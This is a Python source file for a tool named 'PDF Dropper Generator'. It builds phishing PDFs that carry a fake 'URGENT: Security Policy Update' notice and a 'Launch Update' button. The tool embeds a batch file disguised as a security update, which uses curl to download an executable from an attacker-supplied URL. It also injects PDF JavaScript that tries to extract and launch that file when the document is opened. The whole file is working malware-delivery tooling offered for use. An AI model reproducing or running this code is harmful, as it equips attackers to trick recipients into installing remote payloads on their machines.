import os
import sys
import img2pdf
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from pypdf import PdfWriter, PdfReader

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗ ██████╗ ████████╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║██╔═══██╗╚══██╔══╝
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║██║   ██║   ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝██║   ██║   ██║
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝ ╚██████╔╝   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝   ╚═════╝    ╚═╝

                                 [bold white]PDF DROPPER GENERATOR v1.0[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def create_pdf_dropper(payload_url, image_path, output_pdf):
    """
    Creates a PDF dropper that embeds the payload and attempts to execute it.
    """
    print_banner()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        bat_file = "security_update.bat"
        temp_pdf = "temp_base.pdf"
        temp_image = "temp_image.pdf"

        try:
            # 1. Create the BAT file
            task1 = progress.add_task("Generating payload script...", total=1)
            try:
                with open(bat_file, "w") as f:
                    f.write(f'@echo off\n')
                    f.write(f'echo Downloading Security Update...\n')
                    f.write(f'curl -o payload.exe "{payload_url}"\n')
                    f.write(f'echo Update downloaded. Please run payload.exe to complete.\n')
                    f.write(f'pause\n')
                    f.write(f'exit\n')
                progress.update(task1, completed=1)
            except Exception as e:
                console.print(f"[error]Failed to create BAT file: {e}[/]")
                return

            # 2. Build the base PDF using ReportLab
            task2 = progress.add_task("Building PDF structure...", total=1)
            try:
                c = canvas.Canvas(temp_pdf, pagesize=letter)

                # Design
                c.setFont('Helvetica-Bold', 18)
                c.drawCentredString(letter[0]/2, letter[1] - 1.5*inch, "URGENT: Security Policy Update")

                c.setFont('Helvetica', 12)
                text_lines = [
                    "Your organization requires a mandatory security certificate update.",
                    "To maintain access to protected resources, please download and run",
                    "the security update utility attached to this document."
                ]
                y = letter[1] - 2.5*inch
                for line in text_lines:
                    c.drawCentredString(letter[0]/2, y, line)
                    y -= 0.3*inch

                # Button Appearance
                btn_x = letter[0]/2 - 1*inch
                btn_y = letter[1] - 4.5*inch
                c.setFillColorRGB(0.1, 0.4, 0.8)
                c.roundRect(btn_x, btn_y, 2*inch, 0.5*inch, 0.1*inch, fill=1, stroke=0)

                c.setFillColorRGB(1, 1, 1)
                c.setFont('Helvetica-Bold', 12)
                c.drawCentredString(letter[0]/2, btn_y + 0.18*inch, "Launch Update")

                c.save()
                progress.update(task2, completed=1)
            except Exception as e:
                console.print(f"[error]Failed to generate base PDF: {e}[/]")
                return

            # 3. Handle Image
            if image_path:
                task3 = progress.add_task("Processing background image...", total=1)
                try:
                    if os.path.exists(image_path):
                        with open(image_path, "rb") as f:
                            img_pdf_data = img2pdf.convert(f.read())
                        with open(temp_image, "wb") as f:
                            f.write(img_pdf_data)
                        progress.update(task3, completed=1)
                    else:
                        console.print(f"[warning]Image path {image_path} not found. Skipping.[/]")
                        image_path = None
                except Exception as e:
                    console.print(f"[warning]Image conversion failed: {e}. Skipping.[/]")
                    image_path = None

            # 4. Embed file and add JS using pypdf
            task4 = progress.add_task("Injecting payload and automation...", total=1)
            try:
                writer = PdfWriter()

                # Add pages from base PDF
                if os.path.exists(temp_pdf):
                    base_reader = PdfReader(temp_pdf)
                    for page in base_reader.pages:
                        writer.add_page(page)

                # Add image page if exists
                if image_path and os.path.exists(temp_image):
                    img_reader = PdfReader(temp_image)
                    for page in img_reader.pages:
                        writer.add_page(page)

                # Embed the BAT file
                with open(bat_file, "rb") as f:
                    writer.add_attachment(bat_file, f.read())

                # JavaScript to extract and launch
                js_payload = f"""
                try {{
                    this.exportDataObject({{ cName: "{bat_file}", nLaunch: 2 }});
                }} catch (e) {{
                    // Silent fail or handled by viewer
                }}
                """
                writer.add_js(js_payload)

                with open(output_pdf, "wb") as f:
                    writer.write(f)

                progress.update(task4, completed=1)
            except Exception as e:
                console.print(f"[error]Failed to inject payload: {e}[/]")
                return

        finally:
            # 5. Cleanup
            task5 = progress.add_task("Cleaning up...", total=1)
            for f_path in [bat_file, temp_pdf, temp_image]:
                if os.path.exists(f_path):
                    try:
                        os.remove(f_path)
                    except:
                        pass
            progress.update(task5, completed=1)

    console.print(Panel(f"[success]PDF dropper successfully created: [highlight]{output_pdf}[/][/]\n[info]The payload '{bat_file}' is embedded within the PDF.[/]", border_style="success"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MAGXXIC VOT PDF Dropper Generator")
    parser.add_argument("--payload_url", required=True, help="URL of the payload to download.")
    parser.add_argument("--image_path", required=False, help="Path to the image to embed (optional).")
    parser.add_argument("--output_pdf", required=True, help="Output PDF file name.")

    args = parser.parse_args()

    try:
        create_pdf_dropper(args.payload_url, args.image_path, args.output_pdf)
    except KeyboardInterrupt:
        console.print("\n[warning]Operation cancelled by user.[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[error]An unexpected error occurred: {e}[/]")
        sys.exit(1)
